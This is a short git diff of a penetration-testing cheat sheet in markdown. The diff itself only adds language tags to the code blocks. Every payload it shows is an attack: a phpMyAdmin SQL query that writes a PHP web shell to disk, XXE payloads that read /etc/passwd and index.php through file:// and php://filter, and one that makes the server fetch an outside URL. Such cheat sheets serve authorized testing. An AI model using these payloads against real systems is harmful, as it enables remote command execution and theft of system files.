@@ -17,32 +17,32 @@ owasp-zap
 
 ## PhpMyAdmin
 ### Quick Shellcode
-```
+```sql
 SELECT "<?php system($_GET['cmd']); ?>" into outfile "/dir/dir/file.php"
 ```
 
 ## XML external entity (XXE)
 ### Read File
-```
+```xml
 <!DOCTYPE foo [
     <!ENTITY file SYSTEM "file:///etc/passwd">
 ]>
 <foo>Hello &file;</foo>
 ```
-```
+```xml
 <!DOCTYPE foo [
     <!ENTITY file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd" >
 ]>
 <foo>Hello &file;</foo>
 ```
 ### Get Link
-```
+```xml
 <!DOCTYPE foo [
     <!ENTITY file SYSTEM "http://example.com/path">
 ]>
 <foo>Hello &file;</foo>
 ```
-```
+```xml
 <!DOCTYPE foo [
     <!ENTITY file SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">
 ]>
